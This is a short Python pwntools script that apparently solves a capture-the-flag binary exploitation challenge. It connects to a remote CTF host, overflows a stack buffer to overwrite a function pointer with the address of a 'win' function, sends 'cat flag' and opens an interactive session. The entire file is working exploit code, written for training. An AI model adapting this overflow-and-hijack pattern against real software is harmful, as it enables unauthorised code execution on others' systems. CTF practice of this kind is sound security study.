from pwn import *

# From checksec:
# Stack:      No canary found   =>  buffer overflow vulnerability is present
# PIE:        No PIE (0x400000) =>  addresses are static and can be used directly in the exploit

exe = ELF("./mini_game", checksec=False)
OFFSET_TO_FUNC_PTR = 64   # offset to the function pointer that we want to overwrite
ret_gadget = 0x40101a
win_addr = 0x4011fb     # obtained running:  nm ./mini_game | grep win

p = remote("offsec.m0lecon.it", 13559)

p.recvuntil(b"go?")

payload = flat(
    b"A"*OFFSET_TO_FUNC_PTR,
    p64(ret_gadget),    # align stack (actually the precise OFFSET is 72, but using OFFSET=64 and including p64(ret_gadget) here, we're still able to overwrite the function pointer as desired)
    p64(exe.sym.win)    # or p64(win_addr)
)

p.sendline(payload)

p.sendline(b"cat flag")

p.interactive()
